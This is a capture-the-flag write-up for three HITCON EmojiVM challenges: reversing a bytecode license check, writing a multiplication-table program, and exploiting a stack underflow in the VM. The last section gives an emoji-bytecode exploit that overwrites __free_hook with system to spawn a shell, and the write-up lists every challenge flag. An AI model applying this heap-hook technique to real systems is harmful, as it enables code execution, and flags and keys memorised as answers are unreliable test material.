# EmojiVM/EmojiiVM/EmojiiiVM

All three challenges involve a custom emoji-based bytecode for a virtual machine.

## EmojiVM - reverse challenge - 77 solves (187 points)

In the first challenge, we need to reverse engineer a program written in EmojiVM. We're given the VM emulator and a program written in it. The VM simply translates each codepoint in the bytecode (UTF-8 encoded emoji) into a small number based on two different tables. Table 1, the opcode table, translates certain emoji into the numbers 1-23. Table 2, the data table, translates certain other emoji into the numbers 0-10, and is only used with a particular opcode. Reversing the VM, we worked out what each emoji opcode did, and gave them names:

```
🈳 nop
➕ add
➖ sub
❌ mul
❓ mod
❎ xor
👫 and
💀 lt
💯 eq
🚀 jmp
🈶 jnz
🈚 jz
⏬ push
🔝 pop
📤 gget
📥 gset
🆕 galloc
🆓 gfree
📄 gread
📝 gwrite
🔡 dumpstack
🔢 printint
🛑 halt
```

The "g" functions work with a set of ten "global" arrays of bytes which can be freely allocated, written and indexed. Otherwise, every operation works on the stack - there are only two registers, the stack pointer and instruction pointer. The "push" instruction is followed by one of the following 11 "data" emoji with the corresponding value, pushing that value onto the stack:

```
😀 0
😁 1
😂 2
🤣 3
😜 4
😄 5
😅 6
😆 7
😉 8
😊 9
😍 10
```

So, we wrote a simple disassembler ([`disas.py`](disas.py)) which produced [`disas.txt`](disas.txt). A bit of reverse engineering and comments produced [`disas.annotated.txt`](disas.annotated.txt). This program does some "license-key"-style validation of the input, then prints out a success message and decoded flag if the input passes validation. [`rev.py`](rev.py) implements the necessary logic to produce the unique valid key `plis-g1v3-me33-th3e-f14g`, which when punched into the program gives the flag:

`hitcon{R3vers3_Da_3moj1}`

## EmojiiVM - misc challenge - 66 solves (198 points)

All we have to do here is write a program, less than 2000 bytes, which outputs a 9x9 multiplication table. To achieve that, we wrote a macro assembler based on our `disas.py` output, which uses the C preprocessor and some simple label logic. With this assembler, it was just a matter of writing two nested loops. This is the assembly code:

```
#define SET(x) push x; push 0; gset
#define GET(x) push x; push 0; gget

push 2
galloc

push 1; SET(0)
outer:
  push 1; SET(1)
  inner:
    GET(0); printint
    push 32; push 42; push 32; dumpstack
    GET(1); printint
    push 32; push 61; push 32; dumpstack
    GET(0); GET(1); mul; printint
    push 10; dumpstack
  GET(1); push 1; add; SET(1)
  GET(1); push 10; eq; jz inner

GET(0); push 1; add; SET(0)
GET(0); push 10; eq; jz outer

halt
```

and the final EmojiVM program (585 bytes):

```
⏬😂🆕⏬😁⏬😀⏬😀📥⏬😁⏬😁⏬😀📥⏬😀⏬😀📤🔢⏬🤣⏬😍❌⏬😂➕⏬😜⏬😍❌⏬😂➕⏬🤣⏬😍❌⏬😂➕🔡⏬😁⏬😀📤🔢⏬🤣⏬😍❌⏬😂➕⏬😅⏬😍❌⏬😁➕⏬🤣⏬😍❌⏬😂➕🔡⏬😀⏬😀📤⏬😁⏬😀📤❌🔢⏬😍🔡⏬😁⏬😀📤⏬😁➕⏬😁⏬😀📥⏬😁⏬😀📤⏬😍💯⏬😀⏬😍❌⏬😁➕⏬😍❌⏬😆➕🈚⏬😀⏬😀📤⏬😁➕⏬😀⏬😀📥⏬😀⏬😀📤⏬😍💯⏬😀⏬😍❌⏬😀➕⏬😍❌⏬😍➕🈚🛑
```

When sent to the remote server, we get the nice flag:

`hitcon{M0mmy_I_n0w_kN0w_h0w_t0_d0_9x9_em0j1_Pr0gr4mM!ng}`

## EmojiiiVM - pwning challenge - 39 solves (236 points)

I spotted the bug while reversing the VM - almost none of the opcodes actually check to see if the stack is empty before popping it, so we can underflow the stack. Right under the stack is the array of 10 global array pointers, meaning that if we underflow to there we can start messing with those pointers (leaking them to get addresses and then modifying them to get read/what/where).

Our exploit is very simple. Each array pointer points to a header chunk allocated in the heap, which points to the actual data chunk also allocated in the heap. So, we allocate up to arrays 4, 5 and 6, then use an `add` to adjust array 6 so it points at the data area of array 5 (this way, editing array 5 modifies the header of 6). We then leak an array pointer with `printint`. Then, we enter a command loop which lets an external Python program drive reads or writes to array 5 and 6, leak libc, set `__free_hook` to point at system, and trigger `free("/bin/sh")` to get a shell.

[`exploit.s`](exploit.s) contains the exploit program, which assembles to the following EmojiVM code:

```
⏬😁⏬😍❌⏬😅➕🆕⏬😁⏬😍❌⏬😅➕🆕⏬😁⏬😍❌⏬😅➕🆕⏬😁⏬😍❌⏬😅➕🆕⏬😁⏬😍❌⏬😅➕🆕⏬😁⏬😍❌⏬😅➕🆕⏬😁⏬😍❌⏬😅➕🆕➕🔝🔝🔝🔝⏬🤣⏬😍❌⏬😂➕⏬😀➖➕🔝🔢🔝🔝🔝🔝⏬😀⏬😍🔡🔝⏬😄📄⏬😜📄⏬😀⏬😜📤⏬😀💯⏬😁⏬😍❌⏬😉➕⏬😍❌⏬😍➕🈶⏬😀⏬😜📤⏬😁💯⏬😁⏬😍❌⏬😍➕⏬😍❌⏬😄➕🈶⏬😀⏬😜📤⏬😂💯⏬😂⏬😍❌⏬😂➕⏬😍❌⏬🤣➕🈶⏬😀⏬😜📤⏬🤣💯⏬😂⏬😍❌⏬😜➕⏬😍❌⏬😁➕🈶⏬😁⏬😍❌⏬😉➕⏬😍❌⏬😍➕🚀⏬😅📝⏬😀⏬😍❌⏬😊➕⏬😍❌⏬😂➕🚀⏬😅📄⏬😀⏬😍❌⏬😊➕⏬😍❌⏬😂➕🚀⏬😅🆓🛑
```

[`exploit.py`](exploit.py) loads this program and then drives it to get a shell and the flag:

`hitcon{H0p3_y0u_Enj0y_pWn1ng_th1S_3m0j1_vM_^_^b}`
